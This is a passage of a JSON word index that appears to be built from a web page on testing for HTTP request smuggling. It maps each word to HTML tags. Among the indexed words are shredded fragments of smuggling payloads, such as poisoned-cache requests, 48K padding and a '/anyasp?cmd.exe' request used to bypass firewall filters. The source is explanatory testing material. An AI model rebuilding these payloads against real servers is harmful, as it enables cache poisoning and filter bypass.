{
  "id": "73834fdb-07a1-4dc2-95f5-d3511f198035",
  "checksum": "ffb5bba7b2f26c1fdf9a895f39c1ddcc8d64bb58",
  "words": {
    "1": [
      "ul",
      "li",
      "h1",
      "span",
      "p",
      "font",
      "p",
      "p",
      "p",
      "font",
      "p",
      "font",
      "p",
      "p",
      "font"
    ],
    "2": [
      "ul",
      "li",
      "h1",
      "span"
    ],
    "3": [
      "ul",
      "li",
      "h1",
      "span"
    ],
    "4": [
      "ul",
      "li",
      "p",
      "h1",
      "span"
    ],
    "5": [
      "p"
    ],
    "6": [
      "p"
    ],
    "7": [
      "p"
    ],
    "8": [
      "p"
    ],
    "9": [
      "p"
    ],
    "10": [
      "p",
      "p",
      "p"
    ],
    "11": [
      "p"
    ],
    "12": [
      "p"
    ],
    "13": [
      "p"
    ],
    "14": [
      "p"
    ],
    "15": [
      "p"
    ],
    "30": [
      "p"
    ],
    "36": [
      "p"
    ],
    "48": [
      "ul",
      "li"
    ],
    "50": [
      "p",
      "p",
      "p"
    ],
    "61": [
      "p"
    ],
    "527": [
      "p",
      "font",
      "p",
      "font"
    ],
    "2005": [
      "p"
    ],
    "3010": [
      "p",
      "font",
      "p",
      "font"
    ],
    "49152": [
      "p",
      "font",
      "i",
      "p",
      "font",
      "i"
    ],
    "492235": [
      "p",
      "font",
      "p",
      "font"
    ],
    "applies": [
      "h1",
      "span"
    ],
    "to": [
      "h1",
      "span",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "title"
    ],
    "applications": [
      "ul",
      "li"
    ],
    "using": [
      "ul",
      "li",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li"
    ],
    "the": [
      "ul",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "font",
      "i",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "font",
      "i",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "font",
      "i",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "font",
      "i",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "http": [
      "ul",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "h2",
      "span",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "title"
    ],
    "protocol": [
      "ul",
      "li"
    ],
    "summary": [
      "h1",
      "span"
    ],
    "request": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ul",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "ol",
      "ol",
      "li",
      "li",
      "h2",
      "span",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "h2",
      "h2",
      "span",
      "span",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "ul",
      "ul",
      "li",
      "li",
      "p",
      "p",
      "title"
    ],
    "smuggling": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "p",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "h2",
      "span",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "title"
    ],
    "hrs)": [
      "p"
    ],
    "bugs": [
      "p"
    ],
    "allow": [
      "p"
    ],
    "attackers": [
      "p",
      "p",
      "p",
      "p"
    ],
    "smuggle": [
      "p",
      "p",
      "p"
    ],
    "an": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "ol",
      "li"
    ],
    "through": [
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "ol",
      "li",
      "h2",
      "span",
      "ol",
      "li",
      "h2",
      "span",
      "ol",
      "li"
    ],
    "a": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "i",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "ul",
      "ul",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "vulnerable": [
      "p",
      "p",
      "p"
    ],
    "entity": [
      "p"
    ],
    "or": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p"
    ],
    "device": [
      "p",
      "p",
      "p"
    ],
    "such": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p"
    ],
    "as": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "ol",
      "li",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "p"
    ],
    "web": [
      "p",
      "p",
      "ul",
      "li",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "cache": [
      "p",
      "p",
      "ul",
      "li",
      "h2",
      "span",
      "p",
      "p",
      "h2",
      "span",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li"
    ],
    "server": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p"
    ],
    "application": [
      "p",
      "p",
      "ol",
      "li",
      "p"
    ],
    "firewall": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p"
    ],
    "this": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "ol",
      "li",
      "p",
      "p"
    ],
    "vulnerability": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "exists": [
      "p"
    ],
    "because": [
      "p",
      "p",
      "p",
      "p"
    ],
    "of": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "discrepancies": [
      "p"
    ],
    "between": [
      "p"
    ],
    "how": [
      "p",
      "p",
      "p",
      "title"
    ],
    "two": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "ol",
      "li",
      "p"
    ],
    "entities": [
      "p",
      "p",
      "p",
      "p"
    ],
    "parse": [
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "result": [
      "p",
      "p"
    ],
    "attacker": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "ol",
      "li",
      "p",
      "ol",
      "li"
    ],
    "can": [
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "that": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "goes": [
      "p"
    ],
    "undetected": [
      "p"
    ],
    "by": [
      "p",
      "p",
      "p",
      "ol",
      "li",
      "ol",
      "li",
      "p"
    ],
    "one": [
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li"
    ],
    "proxy": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "p"
    ],
    "commonly": [
      "p"
    ],
    "use": [
      "p",
      "p",
      "p"
    ],
    "vulnerabilities": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "title"
    ],
    "bypass": [
      "p",
      "ul",
      "li",
      "h2",
      "span",
      "p",
      "h2",
      "span"
    ],
    "rules": [
      "p",
      "ol",
      "li"
    ],
    "execute": [
      "p",
      "p",
      "p",
      "p"
    ],
    "other": [
      "p",
      "p"
    ],
    "attacks": [
      "p",
      "p",
      "p",
      "p"
    ],
    "cross-site": [
      "p",
      "ul",
      "li",
      "h2",
      "span",
      "p",
      "h2",
      "span"
    ],
    "scripting": [
      "p"
    ],
    "xss),": [
      "p"
    ],
    "poisoning": [
      "p",
      "ul",
      "li",
      "h2",
      "span",
      "p",
      "p",
      "h2",
      "span"
    ],
    "and": [
      "p",
      "ul",
      "ul",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h1",
      "span",
      "p",
      "p",
      "p",
      "p",
      "h1",
      "span",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "ul",
      "li",
      "p"
    ],
    "session": [
      "p"
    ],
    "hijacking": [
      "p",
      "p"
    ],
    "follow": [
      "p",
      "p",
      "p",
      "p"
    ],
    "these": [
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "steps": [
      "p",
      "p",
      "p",
      "p"
    ],
    "in": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "order": [
      "p",
      "p"
    ],
    "test": [
      "p",
      "ul",
      "li",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "h1",
      "span",
      "p",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "p",
      "title"
    ],
    "for": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "h2",
      "span",
      "h2",
      "span",
      "p",
      "p",
      "p",
      "title"
    ],
    "step": [
      "ul",
      "ul",
      "ul",
      "ul",
      "li",
      "li",
      "li",
      "li",
      "h1",
      "span",
      "p",
      "h1",
      "span",
      "p",
      "h1",
      "span",
      "p",
      "p",
      "p",
      "h1",
      "span",
      "p"
    ],
    "understand": [
      "ul",
      "li",
      "h1",
      "span",
      "p",
      "p",
      "p",
      "p"
    ],
    "attack": [
      "ul",
      "li",
      "h1",
      "span",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "scenarios": [
      "ul",
      "li",
      "h1",
      "span",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "analyze": [
      "ul",
      "li",
      "h1",
      "span",
      "p"
    ],
    "causes": [
      "ul",
      "li",
      "h1",
      "span",
      "p",
      "h2",
      "span",
      "p",
      "p"
    ],
    "countermeasures": [
      "ul",
      "li",
      "h1",
      "span",
      "h2",
      "span",
      "p",
      "p"
    ],
    "start": [
      "ul",
      "li",
      "h1",
      "span",
      "ol",
      "li",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "testing": [
      "ul",
      "li",
      "p",
      "p",
      "h1",
      "span",
      "h2",
      "span",
      "h2",
      "span",
      "h2",
      "span",
      "p",
      "p"
    ],
    "exploring": [
      "ul",
      "li",
      "h1",
      "span"
    ],
    "fine-tune": [
      "ul",
      "li",
      "h1",
      "span",
      "p",
      "h2",
      "span"
    ],
    "case": [
      "ul",
      "li",
      "h1",
      "span",
      "p",
      "h2",
      "span",
      "p"
    ],
    "data": [
      "ul",
      "li",
      "p",
      "p",
      "p",
      "h1",
      "span",
      "p",
      "h2",
      "span",
      "p",
      "p"
    ],
    "first": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li"
    ],
    "is": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "they": [
      "p"
    ],
    "are": [
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li"
    ],
    "exploited": [
      "p"
    ],
    "following": [
      "p",
      "p",
      "p"
    ],
    "common": [
      "p"
    ],
    "hrs": [
      "p",
      "p",
      "p",
      "p",
      "h2",
      "span",
      "p"
    ],
    "firewall/ids/ips": [
      "ul",
      "li",
      "h2",
      "span"
    ],
    "forgery": [
      "ul",
      "li",
      "h2",
      "span",
      "p",
      "h2",
      "span"
    ],
    "was": [
      "p"
    ],
    "reported": [
      "p",
      "p"
    ],
    "engineers": [
      "p"
    ],
    "at": [
      "p"
    ],
    "watchfire": [
      "p",
      "p",
      "p",
      "p",
      "i"
    ],
    "corporation": [
      "p"
    ],
    "now": [
      "p",
      "p"
    ],
    "ibm": [
      "p"
    ],
    "possible": [
      "p",
      "p"
    ],
    "sunone": [
      "p",
      "p"
    ],
    "interpret": [
      "p"
    ],
    "content-length": [
      "p",
      "i",
      "p",
      "p",
      "font",
      "font",
      "p",
      "p",
      "i",
      "p",
      "p",
      "font",
      "font",
      "p",
      "p",
      "font",
      "font",
      "p",
      "p",
      "i",
      "i",
      "p",
      "p",
      "font",
      "font",
      "p",
      "i",
      "p",
      "p",
      "i",
      "i",
      "ol",
      "li",
      "i",
      "ol",
      "li",
      "i",
      "ol",
      "li",
      "i",
      "ul",
      "ul",
      "ul",
      "li",
      "i",
      "li",
      "i",
      "li",
      "i"
    ],
    "header": [
      "p",
      "p",
      "p",
      "p",
      "ul",
      "ul",
      "li",
      "li"
    ],
    "differently": [
      "p",
      "p",
      "p"
    ],
    "consists": [
      "p",
      "p"
    ],
    "sending": [
      "p",
      "p",
      "ul",
      "li"
    ],
    "post": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "font",
      "font",
      "font",
      "font",
      "p",
      "p",
      "p",
      "p",
      "p",
      "font",
      "font",
      "font",
      "font",
      "p",
      "font",
      "p",
      "p",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "w/s": [
      "p",
      "p",
      "p"
    ],
    "post http//vulnerable_site/example.html http/1.12": [
      "p",
      "font",
      "p",
      "font"
    ],
    "host": [
      "p",
      "p",
      "p",
      "font",
      "font",
      "font",
      "p",
      "p",
      "p",
      "font",
      "font",
      "font",
      "p",
      "font",
      "p",
      "font"
    ],
    "vulnerable_site3": [
      "p",
      "font",
      "p",
      "font",
      "p",
      "font",
      "p",
      "font"
    ],
    "connection": [
      "p",
      "p",
      "font",
      "font",
      "p",
      "p",
      "font",
      "font",
      "p",
      "p",
      "p",
      "font",
      "font",
      "font",
      "p",
      "p",
      "p",
      "font",
      "font",
      "font"
    ],
    "keep-alive4": [
      "p",
      "font",
      "p",
      "font",
      "p",
      "font",
      "p",
      "font"
    ],
    "content-type": [
      "p",
      "font",
      "p",
      "font",
      "p",
      "i"
    ],
    "application/x-www-form-urlencoded5": [
      "p",
      "font",
      "p",
      "font"
    ],
    "06": [
      "p",
      "font",
      "p",
      "font"
    ],
    "crlf]8": [
      "p",
      "font",
      "p",
      "font"
    ],
    "get": [
      "p",
      "p",
      "font",
      "font",
      "p",
      "p",
      "p",
      "p",
      "p",
      "font",
      "font",
      "p",
      "p",
      "p",
      "font",
      "p",
      "p",
      "font",
      "font",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "ol",
      "li",
      "ul",
      "li"
    ],
    "/poisonhtml": [
      "p",
      "font",
      "p",
      "font"
    ],
    "http/119": [
      "p",
      "font",
      "p",
      "font"
    ],
    "vulnerable_site10": [
      "p",
      "font",
      "p",
      "font"
    ],
    "poisoned!!! space": [
      "p",
      "font",
      "p",
      "font"
    ],
    "after": [
      "p",
      "font",
      "i",
      "p",
      "font",
      "i",
      "p",
      "font",
      "i",
      "p",
      "p",
      "font",
      "i"
    ],
    "\"poisoned!!!\"": [
      "p",
      "font",
      "i",
      "p",
      "font",
      "i"
    ],
    "but": [
      "p",
      "font",
      "i",
      "p",
      "font",
      "i",
      "p",
      "font",
      "i",
      "p",
      "font",
      "i"
    ],
    "no": [
      "p",
      "font",
      "i",
      "p",
      "p",
      "p",
      "font",
      "i",
      "p",
      "font",
      "i",
      "p",
      "font",
      "i"
    ],
    "crlf11": [
      "p",
      "font",
      "p",
      "font"
    ],
    "http//vulnerable_site/target_page.html": [
      "p",
      "font",
      "p",
      "font"
    ],
    "http/1112": [
      "p",
      "font",
      "p",
      "font"
    ],
    "vulnerable_site13": [
      "p",
      "font",
      "p",
      "font"
    ],
    "keep-alive14": [
      "p",
      "font",
      "p",
      "font"
    ],
    "crlf]": [
      "p",
      "font",
      "i",
      "i",
      "p",
      "font",
      "i",
      "i",
      "p",
      "font",
      "i",
      "i",
      "i",
      "p",
      "font",
      "i",
      "i",
      "i"
    ],
    "space": [
      "i",
      "i",
      "p",
      "font",
      "i",
      "p",
      "font",
      "i"
    ],
    "crlf": [
      "i",
      "p",
      "i",
      "i",
      "i",
      "ul",
      "li"
    ],
    "note": [
      "p",
      "p"
    ],
    "each": [
      "p",
      "p",
      "p",
      "p"
    ],
    "line": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "ends": [
      "p"
    ],
    "with": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "ol",
      "li",
      "ul",
      "ul",
      "li",
      "li",
      "p",
      "p",
      "p"
    ],
    "carriage": [
      "p"
    ],
    "return/line": [
      "p"
    ],
    "feed": [
      "p"
    ],
    "crlf),": [
      "p"
    ],
    "except": [
      "p"
    ],
    "ignores": [
      "p"
    ],
    "uses": [
      "p",
      "p",
      "p"
    ],
    "second": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "52),": [
      "p"
    ],
    "so": [
      "p",
      "p",
      "p",
      "p"
    ],
    "it": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "parses": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "part": [
      "p"
    ],
    "lines": [
      "p",
      "p",
      "p",
      "p"
    ],
    "10.": [
      "p"
    ],
    "then": [
      "p",
      "p",
      "p",
      "p"
    ],
    "sends": [
      "p",
      "p",
      "p"
    ],
    "turn": [
      "p"
    ],
    "0)": [
      "p"
    ],
    "assumes": [
      "p"
    ],
    "has": [
      "p",
      "ol",
      "li"
    ],
    "body": [
      "p",
      "p",
      "ul",
      "li"
    ],
    "7.": [
      "p"
    ],
    "since": [
      "p",
      "p"
    ],
    "there": [
      "p",
      "p"
    ],
    "remaining": [
      "p"
    ],
    "single": [
      "p",
      "p"
    ],
    "14:": [
      "p"
    ],
    "when": [
      "p",
      "p"
    ],
    "forwarding": [
      "p"
    ],
    "requests": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "will": [
      "p",
      "p",
      "p",
      "p"
    ],
    "receive": [
      "p",
      "p"
    ],
    "responses": [
      "p"
    ],
    "from": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "assuming": [
      "p"
    ],
    "poisonhtml": [
      "p",
      "i",
      "i"
    ],
    "cacheable": [
      "p"
    ],
    "associate": [
      "p"
    ],
    "target_pagehtm": [
      "p",
      "i"
    ],
    "response": [
      "p"
    ],
    "poisonhtml,": [
      "p"
    ],
    "leading": [
      "p"
    ],
    "client": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "ol",
      "li",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p"
    ],
    "target": [
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p"
    ],
    "page": [
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li"
    ],
    "scenario": [
      "p",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "relates": [
      "p"
    ],
    "bypassing": [
      "p"
    ],
    "protection": [
      "p"
    ],
    "specifically": [
      "p"
    ],
    "layer": [
      "p"
    ],
    "content-based": [
      "p"
    ],
    "filters": [
      "p",
      "p"
    ],
    "block": [
      "p",
      "ol",
      "li"
    ],
    "any": [
      "p",
      "p",
      "ol",
      "li",
      "p"
    ],
    "dangerous": [
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li"
    ],
    "uris": [
      "p",
      "ol",
      "li"
    ],
    "potential": [
      "p"
    ],
    "worm": [
      "p"
    ],
    "filenames": [
      "p"
    ],
    "like": [
      "p",
      "p"
    ],
    "cmdexe": [
      "p"
    ],
    "directory": [
      "p"
    ],
    "traversal": [
      "p"
    ],
    "strings": [
      "p"
    ],
    "\"./../\").": [
      "p"
    ],
    "affected": [
      "p"
    ],
    "iis": [
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "could": [
      "p"
    ],
    "be": [
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p"
    ],
    "used": [
      "p"
    ],
    "exploit": [
      "p"
    ],
    "checkpoint": [
      "p",
      "p",
      "p"
    ],
    "fw-1": [
      "p"
    ],
    "happened": [
      "p"
    ],
    "due": [
      "p"
    ],
    "truncating": [
      "p"
    ],
    "certain": [
      "p",
      "p"
    ],
    "extensions": [
      "p"
    ],
    "which": [
      "p"
    ],
    "exceeds": [
      "p"
    ],
    "48k": [
      "p"
    ],
    "if": [
      "p",
      "p",
      "p",
      "p"
    ],
    "not": [
      "p",
      "p",
      "p",
      "ol",
      "li"
    ],
    "set": [
      "p",
      "ol",
      "li",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "expected": [
      "p",
      "p",
      "p",
      "p"
    ],
    "value": [
      "p"
    ],
    "application/x-www-form-urlencoded": [
      "p",
      "i"
    ],
    "asp": [
      "p"
    ],
    "pages:": [
      "p"
    ],
    "/anyasp": [
      "p",
      "p",
      "p",
      "font",
      "font",
      "font",
      "p",
      "p",
      "p",
      "font",
      "font",
      "font",
      "p",
      "font",
      "p",
      "font"
    ],
    "http/112": [
      "p",
      "font",
      "p",
      "font"
    ],
    "crlf]6": [
      "p",
      "font",
      "p",
      "font"
    ],
    "aaaa..": [
      "p",
      "font",
      "p",
      "font"
    ],
    "\"a\"": [
      "p",
      "font",
      "i",
      "p",
      "font",
      "i"
    ],
    "x": [
      "p",
      "font",
      "i",
      "p",
      "font",
      "i"
    ],
    "48k)]7": [
      "p",
      "font",
      "p",
      "font"
    ],
    "http/108": [
      "p",
      "font",
      "p",
      "font"
    ],
    "keep-alive9": [
      "p",
      "font",
      "p",
      "font"
    ],
    "crlf]11": [
      "p",
      "font",
      "p",
      "font"
    ],
    "http/1012": [
      "p",
      "font",
      "p",
      "font"
    ],
    "bla": [
      "p",
      "font",
      "p",
      "font"
    ],
    "\"bla\",": [
      "p",
      "font",
      "i",
      "p",
      "font",
      "i"
    ],
    "crlf13": [
      "p",
      "font",
      "p",
      "font"
    ],
    "/anyasp?cmd.exe": [
      "p",
      "font",
      "p",
      "font"
    ],
    "http/1014": [
      "p",
      "font",
      "p",
      "font"
    ],
    "keep-alive15": [
      "p",
      "font",
      "p",
      "font"
    ],
    "48k)]": [
      "i",
      "i"
    ],
    "properly": [
      "p",
      "p"
    ],
    "dictated": [
      "p"
    ],
    "doesn’t": [
      "p",
      "p",
      "p",
      "p"
    ],
    "stop": [
      "p",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "parsing": [
      "p",
      "p",
      "p",
      "p"
    ],
    "sequence": [
      "p"
    ],
    "“a”s": [
      "p"
    ],
    "suffer": [
      "p"
    ],
    "truncation": [
      "p"
    ],
    "issue": [
      "p"
    ],
    "however": [
      "p"
    ],
    "truncated": [
      "p"
    ],
    "parsed": [
      "p",
      "ol",
      "li"
    ],
    "finally": [
      "p"
    ],
    "third": [
      "p",
      "ol",
      "li"
    ],
    "malicious": [
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "interprets": [
      "p",
      "p"
    ],
    "processes": [
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li"
    ],
    "three": [
      "p",
      "p"
    ],
    "while": [
      "p"
    ],
    "only": [
      "p",
      "p",
      "ol",
      "li"
    ],
    "see": [
      "p"
    ],
    "last": [
      "p",
      "p"
    ],
    "one.": [
      "p"
    ],
    "discrepancy": [
      "p"
    ],
    "on": [
      "p",
      "p",
      "h2",
      "span",
      "p"
    ],
    "above": [
      "p",
      "p",
      "p",
      "p"
    ],
    "leads": [
      "p"
    ],
    "being": [
      "p"
    ],
    "able": [
      "p",
      "p"
    ],
    "filter": [
      "p",
      "ol",
      "li"
    ],
    "via": [
      "p"
    ],
    "also": [
      "p",
      "p"
    ],
    "enables": [
      "p"
    ],
    "csrf)": [
      "p"
    ],
    "forge": [
      "p"
    ],
    "fake": [
      "p"
    ],
    "action": [
      "p",
      "ol",
      "li",
      "p"
    ],
    "transferring": [
      "p"
    ],
    "money": [
      "p"
    ],
    "victim’s": [
      "p",
